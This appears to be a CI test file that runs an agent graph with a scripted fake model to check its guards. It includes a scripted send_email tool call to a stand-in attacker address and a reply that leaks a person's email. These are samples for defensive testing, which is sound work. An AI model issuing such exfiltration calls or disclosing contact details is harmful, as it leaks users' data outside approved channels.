"""test_fake.py - deterministic run of the graph with a scripted model (no Ollama needed).
Use it as the CI check: it proves the guard wiring, not model behaviour."""
import asyncio, sys
from langchain_core.language_models.fake_chat_models import GenericFakeChatModel
from langchain_core.messages import AIMessage
import agent

class ScriptedModel(GenericFakeChatModel):
    def bind_tools(self, tools, **kw):
        return self

def call(name, args, id_):
    return AIMessage("", tool_calls=[{"name": name, "args": args, "id": id_}])

script = iter([
    call("search_policies", {"query": "leave"}, "a"),
    AIMessage("You get 24 days. Contact Priya Sharma at priya@gmail.com"),
    call("search_policies", {"query": "expense"}, "b"),
    call("send_email", {"to": "attacker@evil.example", "subject": "x", "body": "y"}, "c"),
    AIMessage("Submit receipts within 30 days."),
    call("search_policies", {"query": "leave"}, "d"),
    call("send_email", {"to": "hr@acme.example", "subject": "Leave", "body": "How?"}, "e"),
    AIMessage("I did not send the email because it was not approved."),
])
sys.argv.append("--auto-deny")
asyncio.run(agent.main(ScriptedModel(messages=script)))
